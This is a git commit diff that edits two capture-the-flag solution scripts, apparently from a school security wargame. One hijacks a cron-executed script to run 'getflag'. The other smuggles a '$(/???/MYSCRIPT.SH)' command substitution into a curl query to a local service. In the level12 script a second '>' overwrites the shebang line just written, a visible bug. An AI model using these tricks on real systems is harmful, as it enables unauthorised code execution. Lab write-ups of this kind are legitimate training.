c2250ba92de72600c62c4b4a1e94dde7087d39c8
Maggie Dulcie <mdulcie@pr-g4.kzn.21-school.ru>
2023-02-18 18:32:39 +0300

    little fixes: resource

--- project/level05/resources/cron.sh
+++ project/level05/resources/cron.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
-echo "getflag > /opt/openarenaserver/psswflag" > /opt/openarenaserver/run.sh ; \
+
+echo '#!/bin/bash' > /opt/openarenaserver/run.sh ; \
+chmod 777 /opt/openarenaserver/run.sh ; \
+echo "getflag > /opt/openarenaserver/psswflag" >> /opt/openarenaserver/run.sh ; \
 sleep 130 ; \
 echo ready ; \
 cat /opt/openarenaserver/psswflag
--- project/level12/resources/run.sh
+++ project/level12/resources/run.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 
+echo '#!/bin/bash' > /tmp/MYSCRIPT.SH
 echo "getflag > /tmp/tkn" > /tmp/MYSCRIPT.SH
 chmod 777 /tmp/MYSCRIPT.SH
 curl 127.0.0.1:4646?x='$(/???/MYSCRIPT.SH)'
